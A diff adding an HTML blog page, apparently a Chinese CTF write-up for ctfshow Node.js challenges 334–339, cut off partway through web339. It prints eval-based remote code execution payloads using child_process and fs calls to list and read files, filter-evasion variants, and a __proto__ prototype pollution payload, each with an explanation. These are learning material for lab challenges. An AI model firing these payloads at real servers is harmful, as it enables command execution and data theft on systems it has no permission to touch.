@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+
+  <!-- Minima -->
+  <!-- Hexo theme created by @adisaktijrs -->
+
+  <!-- Basic Page Needs
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <meta charset="utf-8">
+
+  
+  <title>ctfshow_web入门_nodejs</title>
+  
+  <link rel="canonical" href="https://r0sew1thh3r.github.io/2023/01/03/ctfshownodejs/">
+  
+  <meta name="description" content="学习链接：  CTFSHOW nodejs篇_yu22x的博客-CSDN博客 Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)  web334 JS大小写特性这题纯纯考看代码。 user.js 发现 username: &amp;#39;CTFSHOW&amp;#39;, password">
+  
+  
+  <meta name="author" content="R0seW1thH3r">
+  
+  
+  
+  <meta property="og:site_name" content="R0seW1thH3r" />
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="ctfshow_web入门_nodejs" />
+  
+  <meta property="og:description" content="学习链接：  CTFSHOW nodejs篇_yu22x的博客-CSDN博客 Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)  web334 JS大小写特性这题纯纯考看代码。 user.js 发现 username: &amp;#39;CTFSHOW&amp;#39;, password">
+  
+  <meta property="og:url" content="https://r0sew1thh3r.github.io/2023/01/03/ctfshownodejs/" />
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="ctfshow_web入门_nodejs">
+  
+  <meta name="twitter:description" content="学习链接：  CTFSHOW nodejs篇_yu22x的博客-CSDN博客 Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)  web334 JS大小写特性这题纯纯考看代码。 user.js 发现 username: &amp;#39;CTFSHOW&amp;#39;, password">
+  
+  
+  
+  
+  <meta name="twitter:url" content="https://r0sew1thh3r.github.io/2023/01/03/ctfshownodejs/" />
+
+  <!-- Mobile Specific Metas
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- Preload fonts
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <link rel="preload" href="/fonts/dm-serif-display-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+  <link rel="preload" href="/fonts/inter-v2-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+
+  <!-- CSS
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  
+<link rel="stylesheet" href="/css/normalize.css">
+
+  
+<link rel="stylesheet" href="/css/skeleton.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+<link rel="stylesheet" href="/css/prism-dark.css">
+
+  
+<link rel="stylesheet" href="/css/prism-line-numbers.css">
+
+  <!-- User css -->
+  
+  
+<link rel="stylesheet" href="/css/user.css">
+
+  
+
+  <!-- Favicon
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <link rel="icon" type="image/png" href="/images/favicon.png">
+
+  <!-- Custom Theme Color Style
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <style>
+  a:not(.icon) {
+    text-decoration-color: #0FA0CE;
+    background-image: linear-gradient(
+      to bottom,
+      rgba(0, 0, 0, 0) 50%,
+      #0FA0CE 50%
+    );
+  }
+  blockquote {
+    border-left: 8px solid #0FA0CE;
+  }
+  .nanobar .bar {
+    background: #0FA0CE;
+  }
+  .button.button-primary:hover,
+  button.button-primary:hover,
+  input[type="submit"].button-primary:hover,
+  input[type="reset"].button-primary:hover,
+  input[type="button"].button-primary:hover,
+  .button.button-primary:focus,
+  button.button-primary:focus,
+  input[type="submit"].button-primary:focus,
+  input[type="reset"].button-primary:focus,
+  input[type="button"].button-primary:focus {
+    background-color: #0FA0CE;
+    border-color: #0FA0CE;
+  }
+  input[type="email"]:focus,
+  input[type="number"]:focus,
+  input[type="search"]:focus,
+  input[type="text"]:focus,
+  input[type="tel"]:focus,
+  input[type="url"]:focus,
+  input[type="password"]:focus,
+  textarea:focus,
+  select:focus {
+    border: 1px solid #0FA0CE;
+  }
+</style>
+
+  <!-- Google Analytics (With Privacy Settings On)
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  
+
+  
+  <script src="/js/pic.min.js" defer></script>
+  
+
+  
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div class="container">
+    <div class="row">
+      <div>
+
+        <div class="row">
+  <div class="two columns" style="max-width: 50px">
+    <h1 class="mt-2 mode">
+      <div onclick=setDarkMode(true) id="darkBtn">🌑</div>
+      <div onclick=setDarkMode(false) id="lightBtn" class=hidden>☀️</div>
+      <script >
+        if (localStorage.getItem('preferredTheme') == 'dark') {
+          setDarkMode(true)
+        }
+        function setDarkMode(isDark) {
+          var darkBtn = document.getElementById('darkBtn')
+          var lightBtn = document.getElementById('lightBtn')
+          if (isDark) {
+            lightBtn.style.display = "block"
+            darkBtn.style.display = "none"
+            localStorage.setItem('preferredTheme', 'dark');
+          } else {
+            lightBtn.style.display = "none"
+            darkBtn.style.display = "block"
+            localStorage.removeItem('preferredTheme');
+          }
+          document.body.classList.toggle("darkmode");
+        }
+      </script>
+    </h1>
+  </div>
+
+  <div class="six columns ml-1">
+    <h1 class="mt-2">
+      Hi Folks.
+    </h1>
+  </div>
+
+  <div class="twelve columns">
+    <div class="row">
+      <div class="nine columns left">
+        <a href="/">Home</a>
+        
+          
+          <a href="/tags" class="ml">Tags</a>
+          
+        
+          
+          <a href="/about" class="ml">About</a>
+          
+        
+        
+      </div>
+    </div>
+    <hr style="margin-bottom: 2.6rem">
+  </div>
+</div>
+<link rel="stylesheet" href="/js/prism/prism.css">
+        <div class="trans">
+            <h2>ctfshow_web入门_nodejs</h2>
+
+  <p>学习链接：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/111780832">CTFSHOW nodejs篇_yu22x的博客-CSDN博客</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184">Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)</a></li>
+</ul>
+<h1 id="web334-JS大小写特性"><a href="#web334-JS大小写特性" class="headerlink" title="web334 JS大小写特性"></a>web334 JS大小写特性</h1><p>这题纯纯考看代码。</p>
+<p>user.js 发现 <code>username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;</code></p>
+<p>login.js 里有这么一段代码：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token comment">//---------------------------------------------------------------------------</span>
+<span class="token comment">//第一次接触nodejs，所以我对代码做了分析：</span>
+<span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> 
+  <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token comment">//我们输入的username,password当做参数传入这个函数</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span>
+    <span class="token punctuation">(</span>
+      <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token comment">//这里的item代表users,我理解为类的this关键字</span>
+      <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span><span class="token punctuation">)</span> <span class="token comment">//不能等于CTFSHOW全是大写</span>
+            <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//我们输入的字符串转大写后要强等于CTFSHOW</span>
+            <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//密码相等</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>name和password是我们传入的值；item.username和item.password是user.js里的用户名密码。</p>
+<p>我们传入的name不能等于CTFSHOW，name的大写形式要强等于item.username，也就是CTFSHOW。密码要是123456。</p>
+<p>所以我们可以写几个小写：</p>
+<pre class="line-numbers language-none"><code class="language-none">CTFshow
+123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>登录成功获得flag</p>
+<p>看大佬的博客发现还有一个trick，p神文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">Fuzz中的javascript大小写特性 | 离别歌 (leavesongs.com)</a></p>
+<pre class="line-numbers language-none"><code class="language-none">Character.toUpperCase()函数，字符ı会转变为I，字符ſ会变为S
+Character.toLowerCase()函数，字符İ会转变为i，字符K会转变为k<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>学习一波~</p>
+<h1 id="web335-JS-的-RCE"><a href="#web335-JS-的-RCE" class="headerlink" title="web335 JS 的 RCE"></a>web335 JS 的 RCE</h1><p>本题带我们了解掌握 Node.JS 的 RCE。</p>
+<p>在js中，<code>eval()</code>方法用于计算字符串，并把它作为<u>脚本代码来执行</u>。<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/eval">eval() - JavaScript</a></p>
+<p>payload里利用到的child_process： <a target="_blank" rel="noopener" href="http://nodejs.cn/api/child_process.html#child-process">child_process 子进程 | Node.js API 文档</a></p>
+<p>PAYLOAD：</p>
+<pre class="line-numbers language-none"><code class="language-none">?eval&#x3D;require(&quot;child_process&quot;).execSync(&#39;ls&#39;)
+
+?eval&#x3D;require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString()
+
+?eval&#x3D;require(&quot;child_process&quot;)[&#39;exe&#39;%2B&#39;cSync&#39;](&#39;ls&#39;)
+
+?eval&#x3D;require(&#39;child_process&#39;).spawnSync( &#39;ls&#39;, [ &#39;.&#x2F;&#39; ] ).stdout.toString()
+
+?eval&#x3D;global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其他姿势：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;读文件夹，读文件函数
+?eval&#x3D;require(&#39;fs&#39;).readdirSync(&quot;.&quot;)
+?eval&#x3D;require(&#39;fs&#39;).readFileSync(&#39;.&#x2F;fl00g.txt&#39;,&#39;utf8&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;字符串拼接
+?eval&#x3D;var s&#x3D;&#39;global.process.mainModule.constructor._lo&#39;;var b&#x3D;&quot;ad(&#39;child_process&#39;).ex&quot;;var c&#x3D;&quot;ec(%27ls&gt;public&#x2F;1.txt%27);&quot;;eval(s%2Bb%2Bc)%3B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<h1 id="web336-有过滤的RCE"><a href="#web336-有过滤的RCE" class="headerlink" title="web336 有过滤的RCE"></a>web336 有过滤的RCE</h1><p>继上一题RCE，过滤了<code>exec|load</code>。姿势还是很多d。</p>
+<pre class="line-numbers language-none"><code class="language-none">?eval&#x3D;require( &#39;child_process&#39; ).spawnSync( &#39;ls&#39;, [ &#39;.&#39; ] ).stdout.toString()
+?eval&#x3D;require( &#39;child_process&#39; ).spawnSync( &#39;cat&#39;, [ &#39;f*&#39; ] ).stdout.toString()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>补充：</p>
+<p><code>__filename</code>：返回当前模块文件被解析过后的绝对路径。</p>
+<p><code>__dirname</code>：返回当前模块文件解析过后所在的文件夹(目录)的绝对路径。</p>
+<h1 id="web337-js变量"><a href="#web337-js变量" class="headerlink" title="web337 js变量"></a>web337 js变量</h1><p>这题考察对于 js变量 的理解。<br>js变量分为：值类型(基本类型)、引用数据类型（对象类型）。</p>
+<p>题目源码：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">/* GET home page. */</span>
+router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>
+  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  	res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+  	res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>关键代码：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+ 	res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">a[x]&#x3D;1&amp;b[x]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>原理：</p>
+<p><code>a[x]=1&amp;b[x]=2</code> 相当于是说，a和b都是 引用数据类型（<strong>对象</strong>类型），那么在<code>a+flag</code>和<code>b+flag</code> 时，他们的结果就会都是<code>[object Object]flag&#123;xxx&#125;</code> ，那么md5值自然就是一样的了。</p>
+<p>若运行如下代码：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//a,b是对象</span>
+a<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string-property property">'x'</span><span class="token operator">:</span><span class="token string">'1'</span><span class="token punctuation">&#125;</span>
+b<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string-property property">'x'</span><span class="token operator">:</span><span class="token string">'2'</span><span class="token punctuation">&#125;</span>
+
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>两个都会打印出<code>[object Object]flag&#123;xxx&#125;</code>，所以他们的md5也是一样的了。</p>
+<p>为什么传<code>a[0]=1&amp;b[0]=2</code>不行呢，因为当我们这样传的时候相当于创了个<strong>数组</strong>变量<code>a=[1] b=[2]</code></p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//数组变量</span>
+a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+b<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token string">"flag&#123;xxx&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>打印出来的结果是<code>1flag&#123;xxx&#125;</code>和<code>2flag&#123;xxx&#125;</code>，md5就会是不一样的了。</p>
+<h1 id="web338-原型链污染"><a href="#web338-原型链污染" class="headerlink" title="web338 原型链污染"></a>web338 原型链污染</h1><p>本题考察简单的 <u>原型链污染</u>。</p>
+<p>学习链接：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">继承与原型链 - JavaScript | MDN (mozilla.org)</a></p>
+</li>
+</ul>
+<p>源码：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//routes/login.js</span>
+<span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/* GET home page.  */</span>
+router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>
+  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span>
+<span class="token comment">//--------------------------------------------------------------------</span>
+<span class="token comment">//utils/common.js</span>
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">copy</span><span class="token operator">:</span>copy
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> 
+        <span class="token punctuation">&#123;</span>
+            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span> 
+        <span class="token keyword">else</span> 
+        <span class="token punctuation">&#123;</span>
+            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>要让<code>secert.ctfshow===&#39;36dboy&#39;</code>，就会输出flag。</p>
+<p>调用了copy函数：<code>utils.copy(user,req.body);</code>，可以与链接文章里面的merge函数类比。<br>登录的时候抓包，修改post的内容：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>原理：</p>
+<p>我们看copy函数，<code>object1</code>是<code>user</code>，它的定义是<code>let user = &#123;&#125;;</code> ，就是一个空对象。</p>
+<p><code>object2</code>是我们POST的内容，也就是<code>&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code> 。(<code>require(&#39;body-parser&#39;).json()</code> 会解析json)</p>
+<p>第一次循环<code>key</code>是<code>__proto__</code> ，因为每一个对象都有<code>__proto__</code>属性，所以判断为TRUE，然后递归调用copy函数。<br>这次传参，<code>object1</code> 是<code>object1[&#39;__proto__&#39;]</code> ，就是<code>Object&#123;……&#125;</code>，回溯到了Object类了，<br><code>object2</code>是<code>object2[&#39;__proto__&#39;]</code> ，就是<code>&#123; ctfshow: &quot;36dboy&quot; &#125;</code> 。</p>
+<p>此时<code>key</code>为<code>ctfshow</code>。因为Object没有ctfshow这个变量，所以经过判断为FALSE，进入else，执行<code>object1[&#39;ctfshow&#39;] = object2[&#39;ctfshow&#39;]</code> 。将Object类的ctfshow的值改为了<code>36dboy</code> ，那么所有继承object类的类都会有属性ctfshow&#x3D;36dboy，也就是所有类，因为所有类都是object的子类。</p>
+<p><code>var secert = &#123;&#125;;</code> secert被污染，也拥有属性ctfshow&#x3D;36dboy。</p>
+<pre class="line-numbers language-none"><code class="language-none">if(secert.ctfshow&#x3D;&#x3D;&#x3D;&#39;36dboy&#39;)&#123;
+   res.end(flag);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>判断为真，所以输出flag</p>
+<h1 id="web339-原型链污染"><a href="#web339-原型链污染" class="headerlink" title="web339 原型链污染"></a>web339 原型链污染</h1><p>和上一题的区别是：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>flag我们是不知道的，这里不能利用。但是还是可以通过copy函数进行原型链污染。</p>
+<p>比上一题多了一个api.js：</p>
